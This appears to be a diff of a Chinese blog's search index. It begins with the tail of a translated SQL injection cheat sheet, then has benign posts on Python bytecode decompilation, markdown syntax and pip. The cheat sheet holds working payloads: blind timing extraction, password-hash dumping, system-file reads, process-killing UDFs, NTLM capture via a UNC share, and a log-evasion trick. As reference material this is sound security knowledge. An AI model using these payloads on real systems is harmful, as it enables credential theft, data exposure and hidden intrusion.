pg_sleep(10);</code>睡个十秒</li></ul><h3>掩盖痕迹</h3><h4><code>-sp_password log bypass</code>(S)</h4><p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p><h3>注入测试</h3><p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p><ol><li><p><code>product.asp?id=4 (SMO)</code></p><ol><li><code>product.asp?id=5-1</code></li><li><code>product.asp?id=4 OR 1=1</code></li></ol></li><li><p><code>product.asp?name=Book</code></p><ol><li><code>product.asp?name=Bo’%2b’ok</code></li><li><code>product.asp?name=Bo’ || ’ok (OM)</code></li><li><code>product.asp?name=Book’ OR ‘x’=’x</code></li></ol></li></ol><h3>一些其他的MySQL笔记</h3><ul><li>子查询只能在MySQL4.1+使用</li><li>用户<ul><li><code>SELECT User,Password FROM mysql.user;</code></li></ul></li><li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=’2’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li><li><code>SELECT … INTO DUMPFILE</code><ul><li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li></ul></li><li>UDF功能<ul><li><code>create function LockWorkStation returns integer soname ‘user32’;</code></li><li><code>select LockWorkStation();</code></li><li><code>create function ExitProcess returns integer soname ‘kernel32’;</code></li><li><code>select exitprocess();</code></li></ul></li><li><code>SELECT USER();</code></li><li><code>SELECT password,USER() FROM mysql.user;</code></li><li>admin密码哈希的第一位<ul><li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li></ul></li><li>文件读取<ul><li><code>query.php?user=1+union+select+load_file(0x63…),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li></ul></li><li>MySQL读取文件内容<ul><li><strong>默认这个功能是没开启的！</strong><pre><code>create table foo( line blob );<br>load data infile ‘c:/boot.ini’ into table foo;<br>select * from foo;<br></code></pre><ul><li>MySQL里的各种延时</li><li><code>select benchmark( 500000, sha1( ‘test’ ) );<br>query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li><li><code>select if( user() like ‘root@%’, benchmark(100000,sha1(‘test’)), ‘false’ );</code></li><li><strong>遍历数据，暴力猜解</strong><ul><li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(‘test’)), ‘false’ );</code></li></ul></li></ul></li></ul></li></ul><h4>MySQL中好用的函数</h4><ul><li><p><code>MD5()</code></p><p>MD5哈希</p></li><li><p><code>SHA1()</code> </p><p>SHA1哈希</p></li><li><p><code>PASSWORD()</code></p></li><li><code>ENCODE()</code></li><li><p><code>COMPRESS()</code> </p><p>压缩数据，在盲注时读取大量数据很好用</p></li><li><p><code>ROW_COUNT()</code></p></li><li><code>SCHEMA()</code></li><li><p><code>VERSION()</code></p><p>跟<code>@@version</code>是一样的</p></li></ul><h3>SQL注入的高级使用</h3><p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p><blockquote><p>Name:<code>‘ + (SELECT TOP 1 password FROM users ) + ‘</code></p><p>Email : <code>xx@xx.com</code></p></blockquote><p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p><h4>强制SQL Server来得到NTLM哈希</h4><p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p><h4>Bulk insert UNC共享文件 (S)</h4><p><code>bulk insert foo from ‘\YOURIPADDRESS\C$\x.txt’</code></p><h2><span data-wiz-span="data-wiz-span" style="font-size: 10.5pt; font-weight: normal;">转自：<a href="http://yinz.me/Security/22/" target="_blank" rel="external">http://yinz.me/Security/22/</a></span></h2><p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell" target="_blank" rel="external">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p><p><small><em>文档版本：1.4</em></small></p></body></html>
+]]></content>
+      
+        <categories>
+            
+            <category> security </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+            <tag> sql </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[assembly-python]]></title>
+      <url>/2016/01/assembly-python/</url>
+      <content type="html"><![CDATA[<p>学习pyc逆向过程的一个总结</p>
+<h4 id="python执行过程"><a href="#python执行过程" class="headerlink" title="python执行过程"></a>python执行过程</h4><ol>
+<li>Python先把代码（.py文件）编译成字节码，交给字节码虚拟机，然后虚拟机一条一条执行字节码指令，从而完成程序的执行。</li>
+<li>字节码在Python虚拟机程序里对应的是PyCodeObject对象。.pyc文件是字节码在磁盘上的表现形式。</li>
+<li>PyCodeObject对象的创建时机是模块加载的时候，即import。</li>
+<li>Python test.py会对test.py进行编译成字节码并解释执行，但是不会生成test.pyc。</li>
+<li>如果test.py加载了其他模块，如import util，Python会对util.py进行编译成字节码，生成util.pyc，然后对字节码解释执行。</li>
+<li>如果想生成test.pyc，我们可以使用Python内置模块py_compile来编译。</li>
+<li>加载模块时，如果同时存在.py和.pyc，Python会尝试使用.pyc，如果.pyc的编译时间早于.py的修改时间，则重新编译.py并更新.pyc。</li>
+</ol>
+<h4 id="具体的pyc文件结构和PyCodeObject对应格式就不在这说了，我总结的还没网上总结的好呢。"><a href="#具体的pyc文件结构和PyCodeObject对应格式就不在这说了，我总结的还没网上总结的好呢。" class="headerlink" title="具体的pyc文件结构和PyCodeObject对应格式就不在这说了，我总结的还没网上总结的好呢。"></a>具体的pyc文件结构和PyCodeObject对应格式就不在这说了，我总结的还没网上总结的好呢。</h4><h4 id="这只说几种反编译的方法："><a href="#这只说几种反编译的方法：" class="headerlink" title="这只说几种反编译的方法："></a>这只说几种反编译的方法：</h4><h1 id="1-uncompyle2最好用的方法"><a href="#1-uncompyle2最好用的方法" class="headerlink" title="1.uncompyle2最好用的方法"></a>1.uncompyle2最好用的方法</h1><p>新建一个需要反编译的py文件代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def add(a):</div><div class="line">    b = 1</div><div class="line">    a += b</div><div class="line">    return a</div><div class="line"></div><div class="line">class world:</div><div class="line">    def __init__(self):</div><div class="line">        pass</div><div class="line">    def sayHello(self):</div><div class="line">        print &apos;hello,world&apos;</div><div class="line"></div><div class="line">w = world()</div><div class="line">w.sayHello()</div><div class="line"></div><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    print add(1)</div></pre></td></tr></table></figure>
+<p>利用<code>python -m py_compile fun.py</code>这样就产生了pyc文件了。<br>再新建一个decom.py文件代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#coding:utf8</div><div class="line">import marshal</div><div class="line">import uncompyle2</div><div class="line"></div><div class="line">funfile = open(&apos;fun.pyc&apos;,&apos;rb&apos;)</div><div class="line">funfile.read(8) #先读出前8个字节</div><div class="line">content = funfile.read()</div><div class="line">a = marshal.loads(content)</div><div class="line">decomfile = open(&apos;fun_decom.py&apos;,&apos;w&apos;)</div><div class="line">x = uncompyle2.uncompyle(&apos;2.7&apos;,a,decomfile)</div></pre></td></tr></table></figure>
+<p>这里为什么要先读出前8个字节呢，根据pyc的格式决定的:</p>
+<ul>
+<li>因为pyc文件的最开始4个字节是一个Maigc int, 标识此pyc的版本信息, 不同的版本的 Magic 都在 Python/import.c 内定义</li>
+<li>接下来四个字节还是个int,是pyc产生的时间(1970.01.01到产生pyc时候的秒数)</li>
+<li>接下来是个序列化了的 PyCodeObject(此结构在 Include/code.h 内定义),序列化方法在 Python/marshal.c 内定义</li>
+</ul>
+<p>所以这里我们只需要最后的PyCodeObject的内容，所以就先将前8个字节读出来不要了。</p>
+<p>marshal.loads()的作用是反序列化，因为从py文件生成为pyc文件的时候，python内部会有一个序列化的步骤，所以我们需要在反编译之前先反序列化一下。</p>
+<p>在这里marshal有两个函数可以利用，一个就是上面用到的loads函数，他接收的参数是string，也就是pyc除去前8个字节的string；另一个是load函数，他接收的参数是file，所以上面代码需要改一点如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">funfile = open(&apos;fun.pyc&apos;,&apos;rb&apos;)</div><div class="line">funfile.read(8) #先读出前8个字节</div><div class="line">a = marshal.load(funfile)</div></pre></td></tr></table></figure>
+<p>执行完这个decom.py文件后，就会在当前目中中生成一个fun_decom.py的文件，可以拿这个文件和fun.py文件比较一下，是完全一样的。这样就反编译成功了。  </p>
+<h1 id="2-pycdc"><a href="#2-pycdc" class="headerlink" title="2.pycdc"></a>2.pycdc</h1><p>pycdc是github上的一个c++编写的python反编译开源项目，地址为：<a href="https://github.com/zrax/pycdc，他的介绍里面有编译过程，当编译完成后会产生两个可执行程序pycdas和pycdc" target="_blank" rel="external">https://github.com/zrax/pycdc，他的介绍里面有编译过程，当编译完成后会产生两个可执行程序pycdas和pycdc</a></p>
+<p>pycdc是将pyc文件直接反编译为py文件，使用方法为pycdc fun.pyc 这样反编译好的py文件会直接输出到屏幕上，如果想输出到文件中可以用linux中的重定向符”&gt;”，具体为pycdc fun.pyc &gt; decom.py即可</p>
+<p>pycdas是将pyc文件反编译到字节码，输出也是默认到屏幕上。</p>
+<h1 id="3-Easy-Python-Decompiler"><a href="#3-Easy-Python-Decompiler" class="headerlink" title="3.Easy Python Decompiler"></a>3.Easy Python Decompiler</h1><p>这个工具是windows下的python反编译工具。到处都可以下载到，他的内部其实也是利用了uncompyle2模块，然后在上面封装了一下而已。<br>界面如下：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20151022165039.jpg" alt=""></p>
+<p>这是个windows版的工具，可以反编译单个pyc,pyo 文件，或者选定反编译一个指定文件夹下面的pyc,pyo 文件。<br>反编译的结果的名字为原来的名字+”pyc_dic”, 用文本编辑器打开就可以看到源码</p>
+<h3 id="以下是我在反编译程序时遇到的问题"><a href="#以下是我在反编译程序时遇到的问题" class="headerlink" title="以下是我在反编译程序时遇到的问题"></a>以下是我在反编译程序时遇到的问题</h3><p>我遇到一个文件大小为300k左右，以前也遇到过这么大的pyc文件都是可以反编译的，但是这个pyc利用上面的Easy Python Decompiler会出错什么输出都没有；利用pycdc可以输出，但是只能输出一大部分，然后会报错；利用uncompyle2会没有反应，刚开始我以为是出错了，但是没有任何反应，只能看见内存一直在增长，以为是有内存泄露什么的，所以就给关了。</p>
+<p>最终我抱着试一试的态度，让他一直运行，然后看着内存在疯狂的增长，cpu占用100%，这里说一下我的物理内存是16g，交换分区也是16g，等了差不多两个多小时后，物理内存全部用完，交换分区用了8g左右，然后cpu的占用率就下去了，但是内存没有下去，这样又等了半个小时以后，最终的py文件被完全反编译出来了。</p>
+<p>然后看这个py文件，里面有一个字典，它的条目数是12000左右，所以后来分析反编译的过程，得到我的结论是pyc文件中，所有的变量、函数、类、字典类的是数据结构，字符串等都作为反编译的条目，然后这里就会有个递归的过程，学过c语言的都应该知道，如果是数量级大的递归的话需要消耗非常多的内存。这里就是这样的。所以说反编译还是最好用python的uncompyle2模块。</p>
+<p>下面是一个解析pyc文件到xml的代码，我就是从这里面的stacksize猜测出需要递归的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">import dis, marshal, struct, sys, time, types</div><div class="line"></div><div class="line">def show_file(fname):</div><div class="line">    f = open(fname, &quot;rb&quot;)</div><div class="line">    magic = f.read(4)</div><div class="line">    moddate = f.read(4)</div><div class="line">    modtime = time.asctime(time.localtime(struct.unpack(&apos;&lt;l&apos;, moddate)[0]))</div><div class="line">    print &quot;magic %s&quot; % (magic.encode(&apos;hex&apos;))</div><div class="line">    print &quot;moddate %s (%s)&quot; % (moddate.encode(&apos;hex&apos;), modtime)</div><div class="line">    code = marshal.load(f)</div><div class="line">    show_code(code)</div><div class="line"></div><div class="line">def show_code(code, indent=&apos;&apos;):</div><div class="line">    old_indent = indent</div><div class="line">    print &quot;%s&lt;code&gt;&quot; % indent</div><div class="line">    indent += &apos;   &apos;</div><div class="line">    print &quot;%s&lt;argcount&gt; %d &lt;/argcount&gt;&quot; % (indent, code.co_argcount)</div><div class="line">    print &quot;%s&lt;nlocals&gt; %d&lt;/nlocals&gt;&quot; % (indent, code.co_nlocals)</div><div class="line">    print &quot;%s&lt;stacksize&gt; %d&lt;/stacksize&gt;&quot; % (indent, code.co_stacksize)</div><div class="line">    print &quot;%s&lt;flags&gt; %04x&lt;/flags&gt;&quot; % (indent, code.co_flags)</div><div class="line">    show_hex(&quot;code&quot;, code.co_code, indent=indent)</div><div class="line">    print &quot;%s&lt;dis&gt;&quot; % indent</div><div class="line">    dis.disassemble(code)</div><div class="line">    print &quot;%s&lt;/dis&gt;&quot; % indent</div><div class="line"></div><div class="line">    print &quot;%s&lt;names&gt; %r&lt;/names&gt;&quot; % (indent, code.co_names)</div><div class="line">    print &quot;%s&lt;varnames&gt; %r&lt;/varnames&gt;&quot; % (indent, code.co_varnames)</div><div class="line">    print &quot;%s&lt;freevars&gt; %r&lt;/freevars&gt;&quot; % (indent, code.co_freevars)</div><div class="line">    print &quot;%s&lt;cellvars&gt; %r&lt;/cellvars&gt;&quot; % (indent, code.co_cellvars)</div><div class="line">    print &quot;%s&lt;filename&gt; %r&lt;/filename&gt;&quot; % (indent, code.co_filename)</div><div class="line">    print &quot;%s&lt;name&gt; %r&lt;/name&gt;&quot; % (indent, code.co_name)</div><div class="line">    print &quot;%s&lt;firstlineno&gt; %d&lt;/firstlineno&gt;&quot; % (indent, code.co_firstlineno)</div><div class="line"></div><div class="line">    print &quot;%s&lt;consts&gt;&quot; % indent</div><div class="line">    for const in code.co_consts:</div><div class="line">        if type(const) == types.CodeType:</div><div class="line">            show_code(const, indent+&apos;   &apos;)</div><div class="line">        else:</div><div class="line">            print &quot;   %s%r&quot; % (indent, const)</div><div class="line">    print &quot;%s&lt;/consts&gt;&quot; % indent</div><div class="line"></div><div class="line">    show_hex(&quot;lnotab&quot;, code.co_lnotab, indent=indent)</div><div class="line">    print &quot;%s&lt;/code&gt;&quot; % old_indent</div><div class="line"></div><div class="line">def show_hex(label, h, indent):</div><div class="line">    h = h.encode(&apos;hex&apos;)</div><div class="line">    if len(h) &lt; 60:</div><div class="line">        print &quot;%s&lt;%s&gt; %s&lt;/%s&gt;&quot; % (indent, label, h,label)</div><div class="line">    else:</div><div class="line">        print &quot;%s&lt;%s&gt;&quot; % (indent, label)</div><div class="line">        for i in range(0, len(h), 60):</div><div class="line">            print &quot;%s   %s&quot; % (indent, h[i:i+60])</div><div class="line">        print &quot;%s&lt;/%s&gt;&quot; % (indent, label)</div><div class="line"></div><div class="line">show_file(sys.argv[1])</div></pre></td></tr></table></figure>
+<p>使用方法为<code>python showfile.py fun.pyc &gt; fun.xml</code>，里面可以详细的看出pyc的结构，这方面的只是就需要去深入了解pyc的文件结构了</p>
+]]></content>
+      
+        <categories>
+            
+            <category> python </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pyc </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[markdown语法]]></title>
+      <url>/2015/11/markdown/</url>
+      <content type="html"><![CDATA[<ul>
+<li><p>####标题设置（让字体变大，和word的标题意思一样）<br>在Markdown当中设置标题，有两种方式：<br>第一种：通过在文字下方添加“=”和“-”，他们分别表示一级标题和二级标题。<br>第二种：在文字开头加上 “#”，通过“#”数量表示几级标题。（一共只有1~6级标题，1级标题字体最大）</p>
+</li>
+<li><p>####块注释（blockquote）<br>通过在文字开头添加“&gt;”表示块注释。（当&gt;和文字之间添加五个blank时，块注释的文字会有变化。）</p>
+</li>
+<li><p>####斜体<br>将需要设置为斜体的文字两端使用1个“*”或者“_”夹起来</p>
+</li>
+<li><p>####粗体<br>将需要设置为斜体的文字两端使用2个“*”或者“_”夹起来</p>
+</li>
+<li><p>####无序列表<br>在文字开头添加(*, +, and -)实现无序列表。但是要注意在(*, +, and -)和文字之间需要添加空格。（建议：一个文档中只是用一种无序列表的表示方式）</p>
+</li>
+<li><p>####有序列表<br>使用数字后面跟上句号。（还要有空格）</p>
+</li>
+<li><p>####链接（Links）<br>Markdown中有两种方式，实现链接，分别为内联方式和引用方式。</p>
+<ul>
+<li>内联方式：<figure class="highlight plain"><figcaption><span>is an [example link](http://example.com/)```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+ 引用方式：</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p>I get 10 times more traffic from <a href="http://www.tenshine.party" title="tenshine">Google</a> than from <a href="http://www.baidu.com" title="baidu" target="_blank" rel="external">Yahoo</a> or <a href="http://7xljat.com1.z0.glb.clouddn.com/rBACE1M6pcnTWm9gAAAPHBynS-M090_200x200_3.jpg" title="显示的文字" target="_blank" rel="external">MSN</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* ####图片（Images）</div><div class="line">图片的处理方式和链接的处理方式，非常的类似。</div><div class="line"> + 内联方式：</div><div class="line">&gt; ```![alt text](/path/to/img.jpg &quot;Title&quot;)</div></pre></td></tr></table></figure>
+<ul>
+<li>引用方式：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">![alt text][id]</div><div class="line">[id]: /path/to/img.jpg &quot;Title&quot;</div></pre></td></tr></table></figure>
+<ul>
+<li>####代码（HTML中所谓的Code）<br>实现方式有两种：<ul>
+<li>简单文字出现一个代码框。使用<code>&lt;blockquote&gt;</code>。（<code>不是单引号而是左上角的ESC下面~中的</code>）</li>
+<li>大片文字需要实现代码框。使用Tab和四个空格。</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>####下划线<br>在空白行下方添加三个”*”或者三条“-”横线。（前面讲过在文字下方添加“-”，实现的2级标题）</li>
+</ul>
+<p>###下面所有例子展示一遍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">###这是3级标题</div><div class="line">####这是4级标题</div><div class="line">这是2级标题</div><div class="line">------</div><div class="line">这是1级标题</div><div class="line">====</div></pre></td></tr></table></figure></p>
+<p>###这是3级标题</p>
+<p>####这是4级标题</p>
+<h2 id="这是2级标题"><a href="#这是2级标题" class="headerlink" title="这是2级标题"></a>这是2级标题</h2><h1 id="这是1级标题"><a href="#这是1级标题" class="headerlink" title="这是1级标题"></a>这是1级标题</h1><hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; 这是注释</div></pre></td></tr></table></figure>
+<blockquote>
+<p>这是注释</p>
+</blockquote>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*我是斜体*</div><div class="line">_我也是斜体_</div><div class="line">**我是加粗**</div><div class="line">__我也是加粗__</div></pre></td></tr></table></figure>
+<p><em>我是斜体</em></p>
+<p><em>我也是斜体</em></p>
+<p><strong>我是加粗</strong></p>
+<p><strong>我也是加粗</strong></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">* 星号无序</div><div class="line">* 星号无序</div><div class="line">+ 加号无序</div><div class="line">+ 加号无序</div><div class="line">- 减号无序</div><div class="line">- 减号无序</div><div class="line"></div><div class="line">- 外层列表项目</div><div class="line"> + 内层列表项目</div><div class="line"> + 内层列表项目</div><div class="line"> + 内层列表项目</div><div class="line">- 外层列表项目</div></pre></td></tr></table></figure>
+<ul>
+<li>星号无序</li>
+<li>星号无序</li>
+</ul>
+<ul>
+<li>加号无序</li>
+<li>加号无序</li>
+</ul>
+<ul>
+<li>减号无序</li>
+<li><p>减号无序</p>
+</li>
+<li><p>外层列表项目</p>
+<ul>
+<li>内层列表项目</li>
+<li>内层列表项目</li>
+<li>内层列表项目</li>
+</ul>
+</li>
+<li>外层列表项目</li>
+</ul>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 有序</div><div class="line">3. 我是错误的数字，记得和点之间要加空格</div></pre></td></tr></table></figure>
+<ol>
+<li>有序</li>
+<li>我是错误的数字，记得和点之间要加空格</li>
+</ol>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">这是一个[连接](http://www.tenshine.party)</div><div class="line"></div><div class="line">这个[链接][1]是引用的[方式][2]</div><div class="line">[1]:http://www.tenshine.party &quot;tenshine&quot;</div><div class="line">[2]:http://www.baidu.com &quot;baidu&quot;</div></pre></td></tr></table></figure>
+<p>这是一个<a href="http://www.tenshine.party">连接</a></p>
+<p>这个<a href="http://www.tenshine.party" title="tenshine">链接</a>是引用的<a href="http://www.baidu.com" title="baidu" target="_blank" rel="external">方式</a></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">图片内联方式![如果图挂了就显示我](http://7xljat.com1.z0.glb.clouddn.com/rBACE1M6pcnTWm9gAAAPHBynS-M090_200x200_3.jpg &quot;显示的文字&quot;)</div><div class="line">图片引用方式![如果图挂了就显示我][1]</div><div class="line">[1]:http://7xljat.com1.z0.glb.clouddn.com/rBACE1M6pcnTWm9gAAAPHBynS-M090_200x200_3.jpg &quot;显示的文字&quot;</div></pre></td></tr></table></figure>
+<p>图片内联方式<img src="http://7xljat.com1.z0.glb.clouddn.com/rBACE1M6pcnTWm9gAAAPHBynS-M090_200x200_3.jpg" alt="如果图挂了就显示我" title="显示的文字"><br>图片引用方式<img src="http://7xljat.com1.z0.glb.clouddn.com/rBACE1M6pcnTWm9gAAAPHBynS-M090_200x200_3.jpg" alt="如果图挂了就显示我" title="显示的文字"></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">```这是三个&lt;blockquote&gt;。（不是单引号而是左上角的ESC下面~中的）</div><div class="line"> #include &lt;stdio.h&gt;</div><div class="line"> int main()</div><div class="line"> &#123;</div><div class="line">     print(&quot;hello markdown&quot;);</div><div class="line">     return 0;</div><div class="line"> &#125;</div><div class="line">```这是三个&lt;blockquote&gt;。（不是单引号而是左上角的ESC下面~中的）</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    print(&quot;hello markdown&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">___</div><div class="line">***</div></pre></td></tr></table></figure>
+<hr>
+<hr>
+<p>这上面的例子看着真乱，昨天刚用markdown，就这样吧。</p>
+<p>推荐一款在线的Markdown编辑器：<a href="https://stackedit.io/" target="_blank" rel="external">https://stackedit.io/</a></p>
+<p>一款linux的编辑器remarkable:国内墙了，我百度盘地址<a href="http://pan.baidu.com/s/1pJ3U8e3" target="_blank" rel="external">http://pan.baidu.com/s/1pJ3U8e3</a></p>
+<p><em>转自：<a href="http://www.cnblogs.com/hnrainll/p/3514637.html" target="_blank" rel="external">http://www.cnblogs.com/hnrainll/p/3514637.html</a> 加上我自己的改进</em></p>
+]]></content>
+      
+        <categories>
+            
+            <category> other </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> markdown </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[使用pip安装python包]]></title>
+      <url>/2015/10/pipinstall/</url>
+      <content type="html"><![CDATA[<p>Pip 是安装python包的工具，提供了安装包，列出已经安装的包，升级包以及卸载包的功能。</p>
+<p>ubutu下安装pip命令：<code>sudo apt-get install python-pip</code></p>
+<h4 id="1-pip使用详解"><a href="#1-pip使用详解" class="headerlink" title="1 pip使用详解"></a>1 pip使用详解</h4><ul>
+<li>pip安装包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">安装包</div><div class="line">pip install SomePackage</div><div class="line">[...]</div><div class="line">Successfully installed SomePackage</div><div class="line">　</div><div class="line">指定版本号安装</div><div class="line">(sudo) pip install Django==1.8.3</div><div class="line">　</div><div class="line">一次安装多个</div><div class="line">(sudo) pip install BeautifulSoup4 fabric virtualenv</div></pre></td></tr></table></figure>
+<p>如果需要安装的包比较多的时候，这样做会比较繁琐，我们还有一键安装的方法。首先新建一个文本文件，如：requirements.txt，然后将你需要安装的包名保存到该文件中(根据自己的需要)，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Babel==1.3</div><div class="line">Flask==0.10.1</div><div class="line">Flask-Login==0.2.7</div><div class="line">Flask-SQLAlchemy==1.0</div><div class="line">Flask-WTF==0.9.3</div><div class="line">Jinja2==2.7.1</div><div class="line">SQLAlchemy==0.8.2</div><div class="line">WTForms==1.0.5</div><div class="line">Werkzeug==0.9.4</div><div class="line">psycopg2==2.5.1</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>最后你只需要输入以下命令，所有需要的包就可以全部安装好了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip install -r requirements.txt</div></pre></td></tr></table></figure></p>
+<p>如果没有出现错误，祝贺你：安装成功了。</p>
+<ul>
+<li>pip查看已安装的包的信息</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># pip show --files SomePackage</div><div class="line">  Name: SomePackage</div><div class="line">  Version: 1.0</div><div class="line">  Location: /my/env/lib/pythonx.x/site-packages</div><div class="line">  Files:</div><div class="line">   ../somepackage/__init__.py</div><div class="line">   [...]</div></pre></td></tr></table></figure>
+<ul>
+<li><p>查看当前环境中都安装了哪些包<code>$ pip freeze</code></p>
+</li>
+<li><p>pip检查哪些包需要更新</p>
+</li>
+</ul>
